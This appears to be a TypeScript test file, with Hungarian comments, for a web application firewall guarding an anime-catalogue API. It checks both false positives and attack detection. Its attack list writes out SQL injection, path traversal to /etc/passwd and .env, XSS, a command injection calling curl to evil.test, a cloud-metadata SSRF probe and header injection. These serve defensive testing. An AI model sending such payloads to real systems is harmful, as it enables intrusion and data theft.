// A WAF: mit fog meg, és — sokkal fontosabb — mit NEM.
//
// Egy WAF értéke nem azon múlik, hány támadást ismer fel. Azon múlik, hány
// valódi felhasználót enged át. Egy réteg, ami minden századik keresést
// megfogja, rosszabb, mint amilyen nincs: az operátor kikapcsolja, és utána
// semmi nincs.
//
// Ezért ebben a fájlban a hamis találatok tesztje áll elöl, és az hosszabb.

import assert from 'node:assert/strict'
import { describe, test } from 'node:test'

import { inspect, RULES, totalScore, worst } from '../src/modules/edge/waf.ts'

const req = (url: string, extra: Partial<Parameters<typeof inspect>[0]> = {}) => ({
  url,
  query: url.includes('?') ? url.slice(url.indexOf('?') + 1) : '',
  headers: {},
  ...extra
})

describe('the WAF lets real traffic through', () => {
  // Valódi YUME-forgalom. Mindegyik olyan kérés, amit a kliens tényleg küld,
  // vagy amit egy felhasználó tényleg begépel.
  const ordinary = [
    '/v1/anime?sort=popularity&limit=25',
    '/v1/anime?genre=slice-of-life&season=SUMMER&year=2024',
    '/v1/anime/search?q=Shingeki%20no%20Kyojin',
    "/v1/anime/search?q=Fruits%20Basket%3A%20The%20Final",
    '/v1/anime/search?q=Re%3AZero%20kara%20Hajimeru',
    '/v1/anime/search?q=K-On!',
    '/v1/anime/search?q=Yu-Gi-Oh!%20Duel%20Monsters',
    '/v1/anime/search?q=%E9%80%B2%E6%92%83%E3%81%AE%E5%B7%A8%E4%BA%BA',
    '/v1/anime/9985a8c7-1c22-4fa1-851f-f7c314f35a08/episodes?limit=50',
    '/v1/me/library?limit=200',
    '/v1/me/progress/955d61ec-35b5-4bd2-8391-3b8f110e68de',
    '/v1/anime/schedule?from=2026-09-01T00%3A00%3A00Z&to=2026-09-08T00%3A00%3A00Z',
    '/v1/admin/analytics/visitors?range=30d',
    '/v1/admin/catalogue?q=Nichijou&visibility=public'
  ]

  for (const url of ordinary) {
    test(`nem fog meg: ${url.slice(0, 60)}`, () => {
      const hits = inspect(req(url))
      assert.deepEqual(hits, [], `hamis találat: ${hits.map(h => h.rule).join(', ')}`)
    })
  }

  test('a user writing about SQL injection in a comment is not an attacker', () => {
    // Egy anime-oldalon ez gyakoribb, mint az igazi támadás: valaki egy
    // fórumban a biztonságról beszél. A védelem ott a paraméteres lekérdezés,
    // nem a mintaillesztés.
    const hits = inspect(req('/v1/comments', {
      body: { body: "Olvastam egy cikket: a ' OR 1=1-- a klasszikus példa SQL-injekcióra." }
    }))
    assert.deepEqual(hits, [], `a hozzászólás megfogódott: ${hits.map(h => h.rule).join(', ')}`)
  })

  test('a code snippet in a forum post is not an attack either', () => {
    const hits = inspect(req('/v1/forum/topics', {
      body: { body: '<script>alert(1)</script> — ez az, amit a CSP megfog, nem a WAF.' }
    }))
    assert.deepEqual(hits, [], `a fórumbejegyzés megfogódott: ${hits.map(h => h.rule).join(', ')}`)
  })

  test('a title with a colon, quote or ampersand is ordinary', () => {
    for (const q of ["Kimi no Na wa.", "Gintama'", 'Fate/stay night', 'Sword Art Online: Alicization']) {
      const hits = inspect(req('/v1/anime/search?q=' + encodeURIComponent(q)))
      assert.deepEqual(hits, [], `"${q}" megfogódott: ${hits.map(h => h.rule).join(', ')}`)
    }
  })
})

describe('the WAF catches what it is for', () => {
  const attacks: Array<[string, string]> = [
    ['sqli.union', "/v1/anime?genre=a' UNION SELECT password_hash FROM users--"],
    ['sqli.tautology', "/v1/anime?genre=x' or '1'='1"],
    ['sqli.stacked', '/v1/anime?sort=x;DROP TABLE users'],
    ['sqli.function', '/v1/anime?limit=1&sort=pg_sleep(10)'],
    ['traversal.dotdot', '/v1/anime/../../../../etc/hosts'],
    ['traversal.sensitive', '/assets/../.env'],
    ['xss.script', '/v1/anime/search?q=<script>fetch(1)</script>'],
    ['xss.handler', '/v1/anime/search?q=x%22%20onerror=alert(1)'],
    ['cmdi.shell', '/v1/anime?sort=x;curl http://evil.test/a'],
    ['ssrf.internal', '/v1/anime/resolve?url=http://169.254.169.254/latest/meta-data/'],
    ['probe.admin', '/wp-admin/install.php'],
    ['probe.extension', '/index.php']
  ]

  for (const [rule, url] of attacks) {
    test(`megfogja: ${rule}`, () => {
      const hits = inspect(req(url))
      assert.ok(hits.some(h => h.rule === rule),
        `${rule} nem talált rá erre: ${url} (találatok: ${hits.map(h => h.rule).join(', ') || 'egy sem'})`)
    })
  }

  test('percent-encoded traversal is decoded once and caught', () => {
    const hits = inspect(req('/v1/anime/%2e%2e%2f%2e%2e%2fetc/passwd'))
    assert.ok(hits.length > 0, 'a kódolt bejárás átment')
  })

  test('a header with a newline is a response-splitting attempt', () => {
    const hits = inspect(req('/v1/anime', { headers: { referer: 'https://a.test/\r\nX-Injected: 1' } }))
    assert.ok(hits.some(h => h.rule === 'header.injection'))
  })

  test('credentials are never scanned, whatever they contain', () => {
    // Egy jelszó tartalmazhat bármit. Az `authorization` és a `cookie` nem
    // kerülhet a vizsgálatba — se találatként, se naplóba.
    const hits = inspect(req('/v1/auth/login', {
      headers: {
        authorization: "Bearer x' OR 1=1--",
        cookie: 'yume_refresh=<script>alert(1)</script>'
      }
    }))
    assert.deepEqual(hits, [], 'a hitelesítő adat bekerült a vizsgálatba')
  })
})

describe('the rules themselves', () => {
  test('every rule has a stable id, a Hungarian title and a score', () => {
    const ids = new Set<string>()
    for (const rule of RULES) {
      assert.ok(/^[a-z]+\.[a-z]+$/.test(rule.id), `furcsa azonosító: ${rule.id}`)
      assert.equal(ids.has(rule.id), false, `két szabály ugyanazzal az azonosítóval: ${rule.id}`)
      ids.add(rule.id)
      assert.ok(rule.title.length > 8, `${rule.id}: nincs érdemi címe`)
      assert.ok(rule.score > 0 && rule.score <= 100, `${rule.id}: ${rule.score} pont`)
      assert.ok(rule.where.length > 0, `${rule.id}: sehol nem néz`)
    }
  })

  test('a rule can be switched off without touching the code', () => {
    const url = '/wp-admin/install.php'
    assert.ok(inspect(req(url)).some(h => h.rule === 'probe.admin'))
    const off = inspect(req(url), { disabled: new Set(['probe.admin']) })
    assert.equal(off.some(h => h.rule === 'probe.admin'), false)
  })

  test('several hits add up, and the worst one is named', () => {
    const hits = inspect(req("/v1/anime?genre=a' UNION SELECT x FROM users--&sort=x;DROP TABLE y"))
    assert.ok(hits.length >= 2, 'csak egy találat lett')
    assert.ok(totalScore(hits) > hits[0]!.score, 'a pontszámok nem adódnak össze')
    assert.equal(worst(hits)?.severity, 'critical')
  })

  test('a body larger than the scan window does not stall the request', () => {
    // Egy 5 MB-os törzs teljes végigpásztázása minden szabállyal a forró úton
    // nem fér bele. A vizsgálat az elejére korlátozódik, és ezt ki is mondjuk.
    const huge = 'a'.repeat(5 * 1024 * 1024)
    const started = Date.now()
    inspect(req('/v1/comments', { body: huge }))
    assert.ok(Date.now() - started < 500, 'a nagy törzs átvizsgálása túl sokáig tartott')
  })
})
